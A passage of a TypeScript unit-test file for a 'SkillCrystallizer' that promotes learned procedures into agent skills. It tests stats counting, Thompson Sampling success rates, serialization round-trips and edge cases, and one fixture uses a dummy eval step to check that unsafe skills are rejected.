		it("counts approved (not yet registered) skills", () => {
			const c = new SkillCrystallizer({ autoRegister: false });
			c.crystallize([makeReadyVidhi()]);

			const s = c.stats();
			expect(s.approved).toBe(1);
			expect(s.registered).toBe(0);
		});

		it("counts failed skills", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "fail-v",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Use eval('x') for danger" },
				],
			});
			c.crystallize([vidhi]);

			const s = c.stats();
			expect(s.failed).toBe(1);
		});

		it("counts rejected skills", () => {
			const c = new SkillCrystallizer({ autoRegister: false });
			const results = c.crystallize([makeReadyVidhi()]);
			c.reject(results[0].id, "nope");

			const s = c.stats();
			expect(s.rejected).toBe(1);
			expect(s.approved).toBe(0);
		});

		it("counts deprecated skills", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi()]);
			const all = c.listSkills("registered");
			for (const sk of all) {
				for (let i = 0; i < 10; i++) c.recordOutcome(sk.id, false);
			}
			c.deprecateUnderperformers();

			const s = c.stats();
			expect(s.deprecated).toBe(1);
			expect(s.registered).toBe(0);
		});

		it("computes average success rate for registered skills", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi("v1"), makeReadyVidhi("v2")]);

			const all = c.listSkills("registered");
			// Skill 1: 3 successes, 0 failures -> alpha=4, beta=1, mean=0.8
			for (let i = 0; i < 3; i++) c.recordOutcome(all[0].id, true);
			// Skill 2: 1 success, 1 failure -> alpha=2, beta=2, mean=0.5
			c.recordOutcome(all[1].id, true);
			c.recordOutcome(all[1].id, false);

			const s = c.stats();
			// avg = (0.8 + 0.5) / 2 = 0.65
			expect(s.avgSuccessRate).toBeCloseTo(0.65, 1);
		});
	});

	// ── Serialization ─────────────────────────────────────────────────

	describe("serialize() / restore()", () => {
		it("round-trips skills through serialize/restore", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi("v1"), makeReadyVidhi("v2")]);

			const state = c.serialize();
			expect(state.skills).toHaveLength(2);

			const c2 = new SkillCrystallizer();
			c2.restore(state);

			const all = c2.listSkills();
			expect(all).toHaveLength(2);
		});

		it("preserves Thompson Sampling state through serialization", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi()]);
			const skill = c.listSkills("registered")[0];
			c.recordOutcome(skill.id, true);
			c.recordOutcome(skill.id, true);
			c.recordOutcome(skill.id, false);

			const state = c.serialize();
			const c2 = new SkillCrystallizer();
			c2.restore(state);

			const restored = c2.getSkill(skill.id)!;
			expect(restored.thompsonAlpha).toBe(3); // 1 + 2
			expect(restored.thompsonBeta).toBe(2);  // 1 + 1
		});

		it("clears previous state on restore", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi("v1")]);
			expect(c.listSkills()).toHaveLength(1);

			// Restore with different data
			c.restore({ skills: [] });
			expect(c.listSkills()).toHaveLength(0);
		});
	});

	// ── Edge Cases ────────────────────────────────────────────────────

	describe("Edge Cases", () => {
		it("handles Vidhi with zero steps", () => {
			const vidhi = makeVidhi({
				id: "empty-steps",
				steps: [],
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
			});
			const candidates = crystallizer.identifyCandidates([vidhi]);
			expect(candidates[0].steps).toHaveLength(0);
		});

		it("handles Vidhi with empty triggers", () => {
			const vidhi = makeVidhi({
				id: "no-triggers",
				triggers: [],
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
			});
			const candidates = crystallizer.identifyCandidates([vidhi]);
			expect(candidates[0].triggers).toHaveLength(0);
		});

		it("handles Vidhi with boundary threshold values", () => {
			// Exactly at threshold — should be ready
			const vidhi = makeVidhi({
				id: "boundary",
				confidence: DEFAULT_CRYSTALLIZATION_CONFIG.minVidhiConfidence,
				successRate: DEFAULT_CRYSTALLIZATION_CONFIG.minSuccessRate,
				successCount: DEFAULT_CRYSTALLIZATION_CONFIG.minExecutions,
			});
			const candidates = crystallizer.identifyCandidates([vidhi]);
			expect(candidates[0].readyToCrystallize).toBe(true);
		});

		it("handles Vidhi with confidence = 1.0", () => {
			const vidhi = makeVidhi({ confidence: 1.0 });
			const candidates = crystallizer.identifyCandidates([vidhi]);
			expect(candidates[0].readyToCrystallize).toBe(true);
		});

		it("handles Vidhi with very long name", () => {
			const vidhi = makeVidhi({
				id: "long-name",
				name: "a".repeat(500),
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
			});
			const candidates = crystallizer.identifyCandidates([vidhi]);
			expect(candidates[0].readyToCrystallize).toBe(true);

			const results = crystallizer.crystallize([vidhi]);
			expect(results[0].skillName).toContain("crystal-");
		});

		it("generates unique IDs for different Vidhis", () => {
			const c = new SkillCrystallizer();
			const v1 = makeReadyVidhi("vidhi-alpha");
			const v2 = makeReadyVidhi("vidhi-beta");

			const cand1 = c.identifyCandidates([v1])[0];
			const cand2 = c.identifyCandidates([v2])[0];

			const sk1 = c.synthesize(cand1);
			const sk2 = c.synthesize(cand2);

			expect(sk1.id).not.toBe(sk2.id);
		});
	});
});
